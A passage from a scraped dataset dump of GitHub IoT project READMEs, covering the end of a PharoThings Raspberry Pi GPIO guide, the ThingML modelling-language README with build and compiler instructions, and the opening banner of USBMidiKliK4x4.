way, the implementation of a specific raspberry model is very simple task (will be explained later). feel free to implement support for it and contribute the code to the project.\nso for your board model you need to choose an appropriate board class. for raspberry it will be one of the rpiboard subclasses. with the choosen class evaluate the following code to open an inspector:\nremoteboard := remotepharo evaluate: [ rpiboardbrev1 current].\nremoteboard inspect\nin this case we work with raspberry model b revision 1.\nthe board inspector\nthe board inspector provides a scheme of pins similar to raspberry pi docs. but here it is a live -----> tool !!!  which represents the current pins state.\nin the picture the board is shown with two configured pins: gpio3 and gpio4 which are connected to physical button and led accordingly.\ndigital pins are shown with green/red icons which represent high/low (1/0) values. in case of output pins you are able to click on the icon to toggle the value. icons are updated according to pin value changes. if you click on physical button on your board the inspector will show the updated pin state by changing its icon color.\nthe evaluation pane in the bottom of the inspector provides bindings to gpio pins which you can script by #doit/printit commands. the example shows expressions which were used to configure a button and led.\nfor the led we first introduced named variable #led which we assigned to gpio4 pin instance:\nled := gpio4\nthen we configured the pin to be in digital output mode and set the value:\nled bedigitaloutput.\nled value: 1\nit turned the led on.\nfor button we did the same but with digital input mode and extra resistor configuration:\nbutton := gpio3.\nbutton bedigitalinput. \"button\"\nbutton enablepulldownresister.\nyou can notice that gpio variables are not just numbers/ids. pharothings models boards with first class pins. they are real objects with behaviour. for example you can ask pin to toggle a value:\nled toggledigitalvalue\nor ask a pin for current value if you want to check it:\nled value.\nbutton value\nthe following demo shows an inspector in live:\nthe device model\npin scripting is cool and powerful feature but when you need real logic for your pins it is better to put it in objects.\npharothings provides simple high level model of devices which you can use to implement complex interaction with your board.\nfor example with button device you can subscribe on #press/release events:\nbutton := board installdevice: (potbutton named: 'button' frompowerto: gpio3).\nbutton when: potbuttonreleased send: #toggledigitalvalue to: led.\nit will connect the physical button to the led as a switch device which turns the led on and off on button click.\ndevices incapsulate pin configuration logic. you don't need to configure an input pin manually when you create a button instance. just install the device and the pin will work.\nnotice that in example the physical button is connected to the gpio pin from power. that is why we use \"named:frompowerto:\" selector when we create a button instance. but a button can be connected another way, too. and in that case we would use the selector #named:fromgroundto:. it is important to create an instance in the same way as it is connected in the real world because otherwise the button will not work. the reason will be explained later. this logic is hidden by potbutton class and users do not need to think about it.\nnow to toggle the led we still use a script inside inspector. we can replace it with another device potswitch:\nbutton unsubscribe: led. \"disable previous script behaviour\"\nboard installdevice: (potswitch named: 'led switch' for: gpio4 using: button).\n(first line is required because instead toggle will be performed twice which will not change anything)\nthe board inspector provides extra tab to manage installed devices:\nthis tab shows the live state of devices. you can click on output pins to modify values.\nfrom the context menu you can disable and remove devices. and you can also browse the implementation.\nthe following demo shows devices in live:\nimplementing new devices\nthis topic will be described in details later. now look at following demo as a simple example how develop and debug the live raspberry remotely:\npersist board changes\nif the board is configured you can save the remote image to persist board changes:\nremotepharo saveimage\nwhen you restart the image board pins will restore the saved state and installed devices will continue working.\nfor example, try to save the board with an led on. then turn the led of and restart the pharo. when pharo will start, the led will be on (because the image was saved in that state).\nall processes running in pharo are also persistent. for example from the inspector you can connect the button pin to the led with a simple process:\n[ [100 milliseconds wait.\nled value: (button value=1) asbit\n] repeat\n] forknamed: 'button process'.\nit will turn the led on when the button is pressed.\nnow if you save the image this process will continue working after pharo restart.\nall videos above show persistence in live.\ni2c devices\nto interract with i2c device the i2c connection must be opened:\ni2cconnection := board connecttoi2cdevice: addressint\nthe argument is address/id of target device which is physically connected to the board. for rassperry board the result is an instance of wiringpii2cconnection. it provides i/o functions which are available in wiringpi library. for example:\ni2cconnection read8bitsat: 16ra1.\ni2cconnection write8bitsat: 16rf2 data: 16r01.\nin future the connection interface will be improved to be common for different kind of boards.\nto implement model of i2c device the subclass of poti2cdevice should be implemented. poti2cdevice provides prepared i2cconnection. subclases should implement device initialization in connection method. and they should provide required methods to communicate with target devices.\nmcp9808\npotmcp9808device implements model of temperature sensor mcp9808.\nthe code for initialization and sensors reading is copied from python example.\nthe method #readtemperature returns the value in celsius\nto use:\nboard inspector sensor := board installdevice: potmcp9808device new.\nplayground. change the board model to your board sensor := (rpiboard3b current) installdevice: potmcp9808device new.\nbme280\npotbme280device implements temperature/pressure/humidity sensor bme280.\nthe code for initialization and sensors reading is copied from python example.\nthe method #readparameters returns three values: celsius, hpa, humidity percents. in addition there is method #readtemperature to get single value.\nto use:\nboard inspector sensor := board installdevice: potbme280device new.\nboard playground. change the board model to your board sensor := (rpiboard3b current) installdevice: potbme280device new.\nadxl345\npotadxl345device implements accelerometer adxl345.\nthe code for initialization and sensors reading is copied from sunfolder example.\nthe method #readcoordinates returns three values array.\nto use:\nboard inspector sensor := board installdevice: potadxl345device new.\nplayground. change the board model to your board sensor := (rpiboard3b current) installdevice: potadxl345device new.\nhcsr-04 ultrasonic\npothcsr04device implements hcsr-04 ultrasonic sensor\nto use:\nboard inspector ultrasonic := board installdevice: (pothcsr04device triggerpin: 17 gpio echopin: 27 gpio).\nplayground, change the board model to your board ultrasonic := (rpiboard3b current) installdevice: (pothcsr04device triggerpin: 17 gpio echopin: 27 gpio).\nto read the distance use one of the method below.\nreaddistance. \"it will return a number\".\nprintdistance. \"it will return a string\".\nreboot the sensor:\nrebootsensor.\nhd44780 lcd chipset\npotlcdhd44780 implements lcd controller to all devices using this chipset.\npotlcd1602device and potlcd1602devicei2c implements lcd1602 display using gpios and i2c interface.\nto use:\nboard inspector lcd := board installdevice: potlcd1602device new. or to i2c lcd := board installdevice: potlcd1602devicei2c new.\nplayground. change the board model to your board lcd := (rpiboard3b current) installdevice: potlcd1602device new. or to i2c lcd := (rpiboard3b current) installdevice: potlcd1602devicei2c new.\napi:\nshowmessage: 'hello\npharo iot'.\ncleardisplay.\ndisableblinkcursor.\ndisabledisplay.\ndisableunderlinecursor.\nenableblinkcursor.\nenabledisplay.\nenableunderlinecursor.\nmovecursorleft.\nmovecursorright.\nreturnhome.\nsetcursoratrow:2.\nsetcursoratrow:1 column:1.\nsetleftautoscroll.\nsetlefttoright.\nsetrightautoscroll.\nsetrighttoleft.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000473, "year": null}, {"Unnamed: 0": 2518, "autor": 478, "date": null, "content": "The ThingML approach is composed of i) a modeling language, ii) a set of tools and iii) a methodology. The modeling language combines well-proven software modeling constructs for the design and implementation of distributed reactive systems:\nstatecharts and components (aligned with the UML) communicating through asynchronous message passing\nan imperative platform-independent action language\nspecific constructs targeted at IoT applications.\nThe ThingML language is supported by a set of tools, which include editors, transformations (e.g. export to UML) and an advanced multi-platform code generation framework, which support multiple target programming languages (C, Java, Javascript). The methodology documents the development processes and tools used by both the IoT service developers and the platform experts.\nThingML is distributed under the Apache 2.0 licence, and has been developed by @ffleurey and @brice-morin of the Networked Systems and Services department of SINTEF in Oslo, Norway, together with a vibrant open-source community. ThingML is now owned by Tellu, but remains open-source.\nIssues, bug reports and feature requests should be submitted to the issue tracker on GitHub\nInstalling ThingML\nThis section should contain up to date information about getting the latest version of ThingML and getting started with it.\nVersions and Distribution\nThe current recommended version of ThingML is version 2.X.X. Tagged versions are available on the Github release page:\nA standalone JAR which can be used from the command line: look for the most recent *.jar file on the releases page\nAn eclipse update site to install the ThingML IDE in eclipse: look for the most revent *.zip on the releases page\nVersion 1.X.X is not maintained and should not be used (maintenance was stopped in Q3 2017). Version 2.X.X introduces a complete rewrite of the parser and editors based on XText. A few syntactical changes make the ThingML programs written for version 1 not compatible with version 2. There are also a few constructs which were evaluated in version 1 and were not re-implemented in version 2 (e.g. groups, streams, etc).\nThingML Command Line Compiler\nThe ThingML command line compiler is distributed as a standalone JAR. It requires Java 8 or newer. The latest version (*.jar) can be found on the releases pages\nThe command line tool contains all the code generators and plugins which are part of this repository.\nUsage: java -jar ThingML2CLI.jar will provide usage information and a list of options.\nThingML Eclipse-Based IDE\nInstall \"Eclipse IDE for Java and DSL Developers\" from the Eclipse website.\nDownload the most recent update site (*.zip) from the releases pages.\nLaunch Eclipse\nInstall the ThingML plugins from the *.zip file: Help -> Install New Software... -> Add... -> Archive...\nUsage: Once ThingML plugins are installed, *.thingml files will open with the ThingML editors. Right-click on *.thingml files and use HEADS / ThingML sub-menu to compile a ThingML file. Generated code will be put in a thingml-gen folder at the root of the eclipse project. Remember that only ThingML files containing a configuration can be compiled.\nDocker-Based Distribution\nWarning: Currently the image on Dockerub is not automatically updated. You should build the image from the Dockerfile to get an up-to-date version of ThingML.\nIf you have docker, you can use the build container with Eclipse and ThingML at the thingmleditor repository or the thingmleditor docker hub\nSample ThingML programs\nThe goal of this section is to give a list of example which should work out of the box\nNote: over the years and versions, we have collected a lot of different samples and projects made with ThingML. However most of them are not maintained and updated to work with the latest version of ThingML. This might be confusing if you are getting started.\nExamples which should be working out of the box:\nBasic Arduino examples: https://github.com/ffleurey/ThingMLArduinoDemo. The \"1.Basics\" folder contains a set of simple ThingML/Arduino programs dealing with digital IOs.\nMulti-platform Breakout game (Arduino, Posix C, Java and Javascript): https://github.com/ffleurey/ThingML-PongTutorial. This example demonstrate how to create platform independent components with ThingML.\nArduino <-> Java communication (Serial): https://github.com/ffleurey/ThingML-PressureLogger. This program shows has to create 2 ThingML programs communicating over a serial port. One program is running on an Arduino and collects sensor measurement. The other is a running as a Java program collecting the measurement from the Arduino over the USB/Serial connection and displaying curves. This example is quite minimalistic but should be easy to customize for your own sensor/needs. It shows various features of ThingML like the Serial communication plugin and the possibility of adding Maven dependencies to your ThingML programs.\nRaspberry Pi GPIOs: https://github.com/ffleurey/ThingML-RPI-Blink A couple of very simple examples showing how to blink an LED on the Raspberry Pi using either C or NodeJS.\nExample having known incompatibilities:\nNote: Some old samples may be easy to fix but other may use features which have been removed from ThingML.\nExample from the org.thingml.samples in this repository. This folder contains many samples which were made with various versions of ThingML. It is good to explore to see different things that can be done with ThingML but it is not the place to get working samples when getting started.\nTutorials from the HEADS project: https://github.com/HEADS-project/training/tree/master/1.ThingML_Basics. This tutorial is based on ThingML v1.0 which is no longer maintained.\nCompiling ThingML Generated Code\nThe ThingML compiler generate platform specific source code in C, Java, Javascript or Go. This section give short guidelines on how the generated code should be complied and executed.\nJAVA / Maven\nWhen compiling to Java, ThingML creates a complete Maven project which is ready to build with mvn clean install and execute with mvn exec:java.\nPrerequisites:\nMake sure you have a proper JDK (a JRE is not sufficient)\nInstall Maven\nUsing Eclipse:\nConfigure Eclipse so that it uses the JDK: Window -> Preferences -> Java -> Installed JREs (make sure it points to a JDK)\nRight click on pom.xml (in thingml-gen/java/your-configuration)\nRun as -> Maven build...\nIn Goals type: clean install exec:java\nIf Maven claims it cannot find a pom.xml file, change the base directory in the Run as -> Maven build... window using the Workspace... button, so that it points to thingml-gen/java/your-configuration.\njavascript for web browsers\nNothing special. Open the generated index.html file in your System Browser (ideally Chrome or Firefox)\nDo not use the default web browser embedded into Eclipse!\nJavascript for Node.JS\nThingML creates a standard Node.js package.\nPrerequisites:\nNodeJS: Install Node.JS\nUsing Eclipse:\nFrom this update site: Node.JS - http://www.nodeclipse.org/updates/enide-2015/, install Features included in Enide Studio .Features Set and Nodeclipse Node.js .Features Set 1.0.2.201509250223\nRight click on package.json (in thingml-gen/nodejs/your-configuration)\nRun as -> npm install\nRight click on main.js\nRun as -> Node Application\nVisualize UML Diagrams (PlantUML)\nThe files generated by the UML generator are text files which uses the PlantUML format. PlantUML will perform the layout and export the diagrams as images.\nPrerequisites:\nInstall Graphviz\nInstall PlantUML (not needed if using the Eclipse plugin)\nUsing Eclipse:\nInstall PlantUML plugins in Eclipse using this update site: http://hallvard.github.io/plantuml/\nWindow -> Show View -> Other... -> PlantUML\nMake sure you have Graphviz installed. It is required by the Eclipse plugin. If you have issues getting PlantUML to work, follow the instructions from http://plantuml.com/eclipse\nPosix C\nThe generated code is a complete C project which include a Makefile.\nOpen a terminal in the filder containing the generated code\nCompile with make\nRun with ./your-configuration\nPrerequisites:\nUse a C-friendly OS (such as Linux)\nInstall gcc and make + the libraries you are using.\nNote: Virtual box is an option. Ubuntu on Windows 10 works fine as long as there are no graphics/hardware drivers involved.\nArduino C\nOpen the generated file in the Arduino IDE\nCompile\nUpload to your board\nPrerequisites:\nInstall Arduino IDE\nInstall any Arduino libraries which you are using from your ThingML program\nFor more information about how to use the Arduino IDE and Arduino boards, have a look at the Arduino documentation.\nGo\nOpen a terminal at thingml-gen/go/your-configuration\nTo run the program directly: go run *.go\nTo compile to an executable file: go build *.go\nPrerequisites:\nInstall the appropriate Go distribution\nInstall the Go state-machine library used by ThingML go get github.com/SINTEF-9012/gosm\nFor more information about Go package structures, have a look at the Go documentation\nTeensy C\nTeensy compiler has not be tested for some time. Expect some possible issues when trying it.\nPrerequisites:\nInstall Teensyduino IDE\nor\nInstall cross compiled arm toochain\nInstall teensy command line loader\nCompile ThingML from the sources\nYou need Git, Maven, and a proper JDK8+\ngit clone https://github.com/TelluIoT/ThingML.git\ncd ThingML\nmvn clean install\ncd language\nmvn clean install\nThe command-line interface JAR (containing all you need to compile ThingML files) can be found here:\ncd compilers/registry/target\njava -jar compilers.registry-2.0.0-SNAPSHOT-jar-with-dependencies.jar\n--- ThingML help ---\nTypical usages:\njava -jar your-jar.jar -t <tool> -s <source> [-o <output-dir>] [--options <option>][-d]\nUsage: <main class> [options]\nOptions:\n--compiler, -c\nCompiler ID (Mandatory unless --tool (-t) is used)\n--create-dir, -d\nCreate a new directory named after the configuration for the output\nDefault: false\n--help, -h\nDisplay this message.\nDefault: false\n--list-plugins\nDisplay the list of available plugins\nDefault: false\n--options\nadditional options for ThingML tools.\n--output, -o\nOptional output directory - by default current directory is used\n--source, -s\nA thingml file to compile (should include at least one configuration)\n--tool, -t\nTool ID (Mandatory unless --compiler (-c) is used)\nCompiler Id must belong to the following list:\n?? sintefboard - Generates C++ based in code for Arduino.\n?? posixmt - Generates C code for Linux or other Posix runtime environments (GCC compiler).\n?? java - Generates plain Java code.\n?? arduino - Generates C/C++ code for Arduino or other AVR microcontrollers (AVR-GCC compiler).\n?? UML - Generates UML diagrams in PlantUML\n?? browser - Generates Javascript code that can run in common Web Browsers.\n?? nodejsMT - Generates Multi-Process Javascript code (one nodejs process per instance) for the NodeJS platform.\n?? nodejs - Generates Javascript code for the NodeJS platform.\n?? posix - Generates C/C++ code for Linux or other Posix runtime environments (GCC compiler).\n?? debugGUI - Generates html/js mock-up for other a ThingML external connector\nTool Id must belong to the following list:\n?? testconfigurationgen - Generates test configuration for things annnotated with @test \"input # output\".\n\ud83d\udd37 FAQ\n\ud83d\udd39 Where can ThingML code run?\nNowhere! Or almost everywhere, from microcontrollers to the cloud!\nA ThingML file per se is a design-time specification of the structure (components) and behavior (state machines) of a reactive system. It cannot be directly executed.\nA ThingML file can however be compiled (or transformed) to Java/JavaScript/C/Arduino source code, which can in turn be compiled and executed on a platform. Code generated from ThingML has been successfully executed on a large number of platforms: PC Windows/Linux, Raspberry Pi 1, 2 and 3, Intel Edison, Arduino Uno/Mega/Yun/Mini, ESP8266/ESP32, Trinket, Teensy, and probably others.\n\ud83d\udd39 How to express this or that in ThingML?\nA set of tutorials is available here. The tutorials describe the most common features of ThingML. In addition, an extensive set of tests describes pretty much all the concepts available. Have a look there is you wonder how to express something. Should this information be insufficient, have a look below.\n\ud83d\udd39 How is ThingML formalized?\nThe ThingML language is formalized into an EMF-based metamodel. The textual syntax is formalized as an XText grammar.\n\ud83d\udd39 All that code is wonderful, but I need some Science... \ud83d\udcda\nThingML is backed by a set of scientific publications (PDFs can easily be found on e.g. Google Scholar):\nModel-Based Software Engineering to Tame the IoT Jungle\nBrice Morin, Nicolas Harrand and Franck Fleurey\nIn IEEE Software, Special Issue on Internet of Things, 2017.\nThingML, A Language and Code Generation Framework for Heterogeneous Targets\nN. Harrand, F. Fleurey, B. Morin and K.E. Husa\nIn MODELS\u201916: ACM/IEEE 19th International Conference on Model Driven Engineering Languages and Systems. Practice and Innovation track. St Malo, France, October 2-7, 2016\nMDE to Manage Communications with and between Resource-Constrained Systems\nF. Fleurey, B. Morin, A. Solberg and O. Barais.\nIn MODELS\u201911: ACM/IEEE 14th International Conference on Model Driven Engineering Languages and Systems. Wellington, New Zealand, October 2011.\nThingML has also been used together with other approaches:\nAgile Development of Home Automation System with ThingML\nA. Vasilevskiy, B. Morin, \u00d8. Haugen and P. Evensen.\nIn INDIN\u201916: 14th IEEE International Conference on Industrial Informatics. Poitiers, France, July 18-21, 2016\nA Generative Middleware for Heterogeneous and Distributed Services\nB. Morin, F. Fleurey, K.E. Husa, and O. Barais.\nIn CBSE\u201916: 19th International ACM Sigsoft Symposium on Component-Based Software Engineering. Venice, Italy, April 5-8, 2016\n\ud83d\udd39 How to embed ThingML in my toolchain?\nThis currently does not work. Pending a solution to Issue #241\nEmbed the command-line inteface JAR described previously in this readme in your classpath.\nYou can also include ThingML as a Maven dependency in your project:\n<dependency>\n<groupId>org.thingml</groupId>\n<artifactId>compilers.registry</artifactId>\n<version>2.0.0-SNAPSHOT</version>\n</dependency>\n...\n<repository>\n<id>thingml-snapshot</id>\n<name>thingml-snapshot</name>\n<url>http://maven.thingml.org/thingml-snapshot/</url>\n</repository>\n<repository>\n<id>thingml-release</id>\n<name>thingml-release</name>\n<url>http://maven.thingml.org/thingml-release/</url>\n</repository>\n\ud83d\udd39 The code generated by ThingML for Java/JS/C/Arduino does not exactly fit my needs\nRather than being monolithic blobs, compilers are implemented in a modular way around a set of extension points defined in the ThingML Code Generation Framework.\n\ud83d\udd39 Why can't I generate Python/Lua/Ruby/you-name-it?\nWell, it is up to you to implement a compiler for whatever language that is not supported by default. What are you waiting for?\n\ud83d\udd39 How can I programatically process ThingML models?\nFile myFile = new File(\"source.thingml\");\nThingMLModel myModel = ThingMLCompiler.loadModel(myFile);\n//Do something\nThingMLCompiler.saveAsThingML(myModel, \"target.thingml\");\n//or\nThingMLCompiler.saveAsXMI(myModel, \"target.xmi\");\nProtip1: Make sure you have a good understanding of the ThingML metamodel\nProtip2: Have a look at the helper functions which simplify some typical treatments\nModels saved this way will contain all the imports that the original file refered to in one big file\nThis feature might currently be broken as we migrated to XText.\n\ud83d\udd37 More", "link": "https://github.com/TelluIoT/ThingML", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "the thingml approach is composed of i) a modeling language, ii) a set of tools and iii) a methodology. the modeling language combines well-proven software modeling constructs for the design and implementation of distributed reactive systems:\nstatecharts and components (aligned with the uml) communicating through asynchronous message passing\nan imperative platform-independent action language\nspecific constructs targeted at iot applications.\nthe thingml language is supported by a set of tools, which include editors, transformations (e.g. export to uml) and an advanced multi-platform code generation framework, which support multiple target programming languages (c, java, javascript). the methodology documents the development processes and tools used by both the iot service developers and the platform experts.\nthingml is distributed under the apache 2.0 licence, and has been developed by @ffleurey and @brice-morin of the networked systems and services department of sintef in oslo, norway, together with a vibrant open-source community. thingml is now owned by tellu, but remains open-source.\nissues, bug reports and feature requests should be submitted to the issue tracker on github\ninstalling thingml\nthis section should contain up to date information about getting the latest version of thingml and getting started with it.\nversions and distribution\nthe current recommended version of thingml is version 2.x.x. tagged versions are available on the github release page:\na standalone jar which can be used from the command line: look for the most recent *.jar file on the releases page\nan eclipse update site to install the thingml ide in eclipse: look for the most revent *.zip on the releases page\nversion 1.x.x is not maintained and should not be used (maintenance was stopped in q3 2017). version 2.x.x introduces a complete rewrite of the parser and editors based on xtext. a few syntactical changes make the thingml programs written for version 1 not compatible with version 2. there are also a few constructs which were evaluated in version 1 and were not re-implemented in version 2 (e.g. groups, streams, etc).\nthingml command line compiler\nthe thingml command line compiler is distributed as a standalone jar. it requires java 8 or newer. the latest version (*.jar) can be found on the releases pages\nthe command line -----> tool !!!  contains all the code generators and plugins which are part of this repository.\nusage: java -jar thingml2cli.jar will provide usage information and a list of options.\nthingml eclipse-based ide\ninstall \"eclipse ide for java and dsl developers\" from the eclipse website.\ndownload the most recent update site (*.zip) from the releases pages.\nlaunch eclipse\ninstall the thingml plugins from the *.zip file: help -> install new software... -> add... -> archive...\nusage: once thingml plugins are installed, *.thingml files will open with the thingml editors. right-click on *.thingml files and use heads / thingml sub-menu to compile a thingml file. generated code will be put in a thingml-gen folder at the root of the eclipse project. remember that only thingml files containing a configuration can be compiled.\ndocker-based distribution\nwarning: currently the image on dockerub is not automatically updated. you should build the image from the dockerfile to get an up-to-date version of thingml.\nif you have docker, you can use the build container with eclipse and thingml at the thingmleditor repository or the thingmleditor docker hub\nsample thingml programs\nthe goal of this section is to give a list of example which should work out of the box\nnote: over the years and versions, we have collected a lot of different samples and projects made with thingml. however most of them are not maintained and updated to work with the latest version of thingml. this might be confusing if you are getting started.\nexamples which should be working out of the box:\nbasic arduino examples: https://github.com/ffleurey/thingmlarduinodemo. the \"1.basics\" folder contains a set of simple thingml/arduino programs dealing with digital ios.\nmulti-platform breakout game (arduino, posix c, java and javascript): https://github.com/ffleurey/thingml-pongtutorial. this example demonstrate how to create platform independent components with thingml.\narduino <-> java communication (serial): https://github.com/ffleurey/thingml-pressurelogger. this program shows has to create 2 thingml programs communicating over a serial port. one program is running on an arduino and collects sensor measurement. the other is a running as a java program collecting the measurement from the arduino over the usb/serial connection and displaying curves. this example is quite minimalistic but should be easy to customize for your own sensor/needs. it shows various features of thingml like the serial communication plugin and the possibility of adding maven dependencies to your thingml programs.\nraspberry pi gpios: https://github.com/ffleurey/thingml-rpi-blink a couple of very simple examples showing how to blink an led on the raspberry pi using either c or nodejs.\nexample having known incompatibilities:\nnote: some old samples may be easy to fix but other may use features which have been removed from thingml.\nexample from the org.thingml.samples in this repository. this folder contains many samples which were made with various versions of thingml. it is good to explore to see different things that can be done with thingml but it is not the place to get working samples when getting started.\ntutorials from the heads project: https://github.com/heads-project/training/tree/master/1.thingml_basics. this tutorial is based on thingml v1.0 which is no longer maintained.\ncompiling thingml generated code\nthe thingml compiler generate platform specific source code in c, java, javascript or go. this section give short guidelines on how the generated code should be complied and executed.\njava / maven\nwhen compiling to java, thingml creates a complete maven project which is ready to build with mvn clean install and execute with mvn exec:java.\nprerequisites:\nmake sure you have a proper jdk (a jre is not sufficient)\ninstall maven\nusing eclipse:\nconfigure eclipse so that it uses the jdk: window -> preferences -> java -> installed jres (make sure it points to a jdk)\nright click on pom.xml (in thingml-gen/java/your-configuration)\nrun as -> maven build...\nin goals type: clean install exec:java\nif maven claims it cannot find a pom.xml file, change the base directory in the run as -> maven build... window using the workspace... button, so that it points to thingml-gen/java/your-configuration.\njavascript for web browsers\nnothing special. open the generated index.html file in your system browser (ideally chrome or firefox)\ndo not use the default web browser embedded into eclipse!\njavascript for node.js\nthingml creates a standard node.js package.\nprerequisites:\nnodejs: install node.js\nusing eclipse:\nfrom this update site: node.js - http://www.nodeclipse.org/updates/enide-2015/, install features included in enide studio .features set and nodeclipse node.js .features set 1.0.2.201509250223\nright click on package.json (in thingml-gen/nodejs/your-configuration)\nrun as -> npm install\nright click on main.js\nrun as -> node application\nvisualize uml diagrams (plantuml)\nthe files generated by the uml generator are text files which uses the plantuml format. plantuml will perform the layout and export the diagrams as images.\nprerequisites:\ninstall graphviz\ninstall plantuml (not needed if using the eclipse plugin)\nusing eclipse:\ninstall plantuml plugins in eclipse using this update site: http://hallvard.github.io/plantuml/\nwindow -> show view -> other... -> plantuml\nmake sure you have graphviz installed. it is required by the eclipse plugin. if you have issues getting plantuml to work, follow the instructions from http://plantuml.com/eclipse\nposix c\nthe generated code is a complete c project which include a makefile.\nopen a terminal in the filder containing the generated code\ncompile with make\nrun with ./your-configuration\nprerequisites:\nuse a c-friendly os (such as linux)\ninstall gcc and make + the libraries you are using.\nnote: virtual box is an option. ubuntu on windows 10 works fine as long as there are no graphics/hardware drivers involved.\narduino c\nopen the generated file in the arduino ide\ncompile\nupload to your board\nprerequisites:\ninstall arduino ide\ninstall any arduino libraries which you are using from your thingml program\nfor more information about how to use the arduino ide and arduino boards, have a look at the arduino documentation.\ngo\nopen a terminal at thingml-gen/go/your-configuration\nto run the program directly: go run *.go\nto compile to an executable file: go build *.go\nprerequisites:\ninstall the appropriate go distribution\ninstall the go state-machine library used by thingml go get github.com/sintef-9012/gosm\nfor more information about go package structures, have a look at the go documentation\nteensy c\nteensy compiler has not be tested for some time. expect some possible issues when trying it.\nprerequisites:\ninstall teensyduino ide\nor\ninstall cross compiled arm toochain\ninstall teensy command line loader\ncompile thingml from the sources\nyou need git, maven, and a proper jdk8+\ngit clone https://github.com/telluiot/thingml.git\ncd thingml\nmvn clean install\ncd language\nmvn clean install\nthe command-line interface jar (containing all you need to compile thingml files) can be found here:\ncd compilers/registry/target\njava -jar compilers.registry-2.0.0-snapshot-jar-with-dependencies.jar\n--- thingml help ---\ntypical usages:\njava -jar your-jar.jar -t <tool> -s <source> [-o <output-dir>] [--options <option>][-d]\nusage: <main class> [options]\noptions:\n--compiler, -c\ncompiler id (mandatory unless --tool (-t) is used)\n--create-dir, -d\ncreate a new directory named after the configuration for the output\ndefault: false\n--help, -h\ndisplay this message.\ndefault: false\n--list-plugins\ndisplay the list of available plugins\ndefault: false\n--options\nadditional options for thingml tools.\n--output, -o\noptional output directory - by default current directory is used\n--source, -s\na thingml file to compile (should include at least one configuration)\n--tool, -t\ntool id (mandatory unless --compiler (-c) is used)\ncompiler id must belong to the following list:\n?? sintefboard - generates c++ based in code for arduino.\n?? posixmt - generates c code for linux or other posix runtime environments (gcc compiler).\n?? java - generates plain java code.\n?? arduino - generates c/c++ code for arduino or other avr microcontrollers (avr-gcc compiler).\n?? uml - generates uml diagrams in plantuml\n?? browser - generates javascript code that can run in common web browsers.\n?? nodejsmt - generates multi-process javascript code (one nodejs process per instance) for the nodejs platform.\n?? nodejs - generates javascript code for the nodejs platform.\n?? posix - generates c/c++ code for linux or other posix runtime environments (gcc compiler).\n?? debuggui - generates html/js mock-up for other a thingml external connector\ntool id must belong to the following list:\n?? testconfigurationgen - generates test configuration for things annnotated with @test \"input # output\".\n\ud83d\udd37 faq\n\ud83d\udd39 where can thingml code run?\nnowhere! or almost everywhere, from microcontrollers to the cloud!\na thingml file per se is a design-time specification of the structure (components) and behavior (state machines) of a reactive system. it cannot be directly executed.\na thingml file can however be compiled (or transformed) to java/javascript/c/arduino source code, which can in turn be compiled and executed on a platform. code generated from thingml has been successfully executed on a large number of platforms: pc windows/linux, raspberry pi 1, 2 and 3, intel edison, arduino uno/mega/yun/mini, esp8266/esp32, trinket, teensy, and probably others.\n\ud83d\udd39 how to express this or that in thingml?\na set of tutorials is available here. the tutorials describe the most common features of thingml. in addition, an extensive set of tests describes pretty much all the concepts available. have a look there is you wonder how to express something. should this information be insufficient, have a look below.\n\ud83d\udd39 how is thingml formalized?\nthe thingml language is formalized into an emf-based metamodel. the textual syntax is formalized as an xtext grammar.\n\ud83d\udd39 all that code is wonderful, but i need some science... \ud83d\udcda\nthingml is backed by a set of scientific publications (pdfs can easily be found on e.g. google scholar):\nmodel-based software engineering to tame the iot jungle\nbrice morin, nicolas harrand and franck fleurey\nin ieee software, special issue on internet of things, 2017.\nthingml, a language and code generation framework for heterogeneous targets\nn. harrand, f. fleurey, b. morin and k.e. husa\nin models\u201916: acm/ieee 19th international conference on model driven engineering languages and systems. practice and innovation track. st malo, france, october 2-7, 2016\nmde to manage communications with and between resource-constrained systems\nf. fleurey, b. morin, a. solberg and o. barais.\nin models\u201911: acm/ieee 14th international conference on model driven engineering languages and systems. wellington, new zealand, october 2011.\nthingml has also been used together with other approaches:\nagile development of home automation system with thingml\na. vasilevskiy, b. morin, \u00f8. haugen and p. evensen.\nin indin\u201916: 14th ieee international conference on industrial informatics. poitiers, france, july 18-21, 2016\na generative middleware for heterogeneous and distributed services\nb. morin, f. fleurey, k.e. husa, and o. barais.\nin cbse\u201916: 19th international acm sigsoft symposium on component-based software engineering. venice, italy, april 5-8, 2016\n\ud83d\udd39 how to embed thingml in my toolchain?\nthis currently does not work. pending a solution to issue #241\nembed the command-line inteface jar described previously in this readme in your classpath.\nyou can also include thingml as a maven dependency in your project:\n<dependency>\n<groupid>org.thingml</groupid>\n<artifactid>compilers.registry</artifactid>\n<version>2.0.0-snapshot</version>\n</dependency>\n...\n<repository>\n<id>thingml-snapshot</id>\n<name>thingml-snapshot</name>\n<url>http://maven.thingml.org/thingml-snapshot/</url>\n</repository>\n<repository>\n<id>thingml-release</id>\n<name>thingml-release</name>\n<url>http://maven.thingml.org/thingml-release/</url>\n</repository>\n\ud83d\udd39 the code generated by thingml for java/js/c/arduino does not exactly fit my needs\nrather than being monolithic blobs, compilers are implemented in a modular way around a set of extension points defined in the thingml code generation framework.\n\ud83d\udd39 why can't i generate python/lua/ruby/you-name-it?\nwell, it is up to you to implement a compiler for whatever language that is not supported by default. what are you waiting for?\n\ud83d\udd39 how can i programatically process thingml models?\nfile myfile = new file(\"source.thingml\");\nthingmlmodel mymodel = thingmlcompiler.loadmodel(myfile);\n//do something\nthingmlcompiler.saveasthingml(mymodel, \"target.thingml\");\n//or\nthingmlcompiler.saveasxmi(mymodel, \"target.xmi\");\nprotip1: make sure you have a good understanding of the thingml metamodel\nprotip2: have a look at the helper functions which simplify some typical treatments\nmodels saved this way will contain all the imports that the original file refered to in one big file\nthis feature might currently be broken as we migrated to xtext.\n\ud83d\udd37 more", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000478, "year": null}, {"Unnamed: 0": 2528, "autor": 488, "date": null, "content": "__ __| | | /_) | ___| | |\n| __ \\ _ \\ ' / | | / | _ \\ __ \\ | _` | __ \\ __|\n| | | | __/ . \\ | < | | __/ | | | ( | | |\\__ \\\n_| _| |_|\\___| _|\\_\\_|_|\\_\\\\____|\\___|_| _| _____|\\__,_|_.__/ ____/\nUSBMidiKliK4x4\nA multi-port USB MIDI interface for the 